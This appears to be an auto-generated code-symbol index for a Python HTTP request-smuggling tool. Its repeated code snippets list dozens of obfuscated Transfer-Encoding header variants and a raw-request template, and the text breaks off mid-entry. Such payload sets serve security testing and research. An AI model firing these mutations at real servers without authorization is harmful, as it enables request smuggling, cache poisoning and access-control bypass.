        "peekOfCode": "\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"XX-%02x-%02x-XX\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"XX-%02x-XX-%02x\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"XX-XX-%02x-%02x\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "render_template",
        "kind": 2,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "def render_template(gadget):\n\tRN = \"\\r\\n\"\n\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tRN",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tRN = \"\\r\\n\"\n\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p\nmutations[\"nameprefix1\"] = render_template(\" Transfer-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "\tp",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p\nmutations[\"nameprefix1\"] = render_template(\" Transfer-Encoding: chunked\")\nmutations[\"tabprefix1\"] = render_template(\"Transfer-Encoding:\\tchunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"nameprefix1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"nameprefix1\"] = render_template(\" Transfer-Encoding: chunked\")\nmutations[\"tabprefix1\"] = render_template(\"Transfer-Encoding:\\tchunked\")\nmutations[\"tabprefix2\"] = render_template(\"Transfer-Encoding\\t:\\tchunked\")\nmutations[\"spacejoin1\"] = render_template(\"Transfer Encoding: chunked\")\nmutations[\"underjoin1\"] = render_template(\"Transfer_Encoding: chunked\")\nmutations[\"smashed\"] = render_template(\"Transfer Encoding:chunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nmutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"tabprefix1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"tabprefix1\"] = render_template(\"Transfer-Encoding:\\tchunked\")\nmutations[\"tabprefix2\"] = render_template(\"Transfer-Encoding\\t:\\tchunked\")\nmutations[\"spacejoin1\"] = render_template(\"Transfer Encoding: chunked\")\nmutations[\"underjoin1\"] = render_template(\"Transfer_Encoding: chunked\")\nmutations[\"smashed\"] = render_template(\"Transfer Encoding:chunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nmutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"tabprefix2\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"tabprefix2\"] = render_template(\"Transfer-Encoding\\t:\\tchunked\")\nmutations[\"spacejoin1\"] = render_template(\"Transfer Encoding: chunked\")\nmutations[\"underjoin1\"] = render_template(\"Transfer_Encoding: chunked\")\nmutations[\"smashed\"] = render_template(\"Transfer Encoding:chunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nmutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"spacejoin1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"spacejoin1\"] = render_template(\"Transfer Encoding: chunked\")\nmutations[\"underjoin1\"] = render_template(\"Transfer_Encoding: chunked\")\nmutations[\"smashed\"] = render_template(\"Transfer Encoding:chunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nmutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"underjoin1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"underjoin1\"] = render_template(\"Transfer_Encoding: chunked\")\nmutations[\"smashed\"] = render_template(\"Transfer Encoding:chunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nmutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"smashed\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"smashed\"] = render_template(\"Transfer Encoding:chunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nmutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"space1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nmutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"valueprefix1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"valueprefix1\"] = render_template(\"Transfer-Encoding:  chunked\")\nmutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"vertprefix1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"vertprefix1\"] = render_template(\"Transfer-Encoding:\\u000Bchunked\")\nmutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"commaCow\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"commaCow\"] = render_template(\"Transfer-Encoding: chunked, cow\")\nmutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"cowComma\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"cowComma\"] = render_template(\"Transfer-Encoding: cow, chunked\")\nmutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"contentEnc\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"contentEnc\"] = render_template(\"Content-Encoding: chunked\")\nmutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"linewrapped1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"linewrapped1\"] = render_template(\"Transfer-Encoding:\\n chunked\")\nmutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"quoted\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"quoted\"] = render_template(\"Transfer-Encoding: \\\"chunked\\\"\")\nmutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"aposed\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"aposed\"] = render_template(\"Transfer-Encoding: 'chunked'\")\nmutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"lazygrep\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"lazygrep\"] = render_template(\"Transfer-Encoding: chunk\")\nmutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"sarcasm\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"sarcasm\"] = render_template(\"TrAnSFer-EnCODinG: cHuNkeD\")\nmutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"yelling\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"yelling\"] = render_template(\"TRANSFER-ENCODING: CHUNKED\")\nmutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"0dsuffix\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"0dsuffix\"] = render_template(\"Transfer-Encoding: chunked\\r\")\nmutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"tabsuffix\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"tabsuffix\"] = render_template(\"Transfer-Encoding: chunked\\t\")\nmutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"revdualchunk\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"revdualchunk\"] = render_template(\"Transfer-Encoding: cow\\r\\nTransfer-Encoding: chunked\")\nmutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"0dspam\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"0dspam\"] = render_template(\"Transfer\\r-Encoding: chunked\")\nmutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"nested\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
        "peekOfCode": "mutations[\"nested\"] = render_template(\"Transfer-Encoding: cow chunked bar\")\nmutations[\"spaceFF\"] = render_template(\"Transfer-Encoding:\\xFFchunked\")\nmutations[\"accentCH\"] = render_template(\"Transfer-Encoding: ch\\x96nked\")\nmutations[\"accentTE\"] = render_template(\"Transf\\x82r-Encoding: chunked\")\nmutations[\"x-rout\"] = render_template(\"X:X\\rTransfer-Encoding: chunked\")\nmutations[\"x-nout\"] = render_template(\"X:X\\nTransfer-Encoding: chunked\")\nfor i in range(0x1,0x20):\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))",
        "detail": "tools.smuggler.configs.exhaustive",
        "documentation": {}
    },
    {
        "label": "mutations[\"spaceFF\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.exhaustive",
        "description": "tools.smuggler.configs.exhaustive",
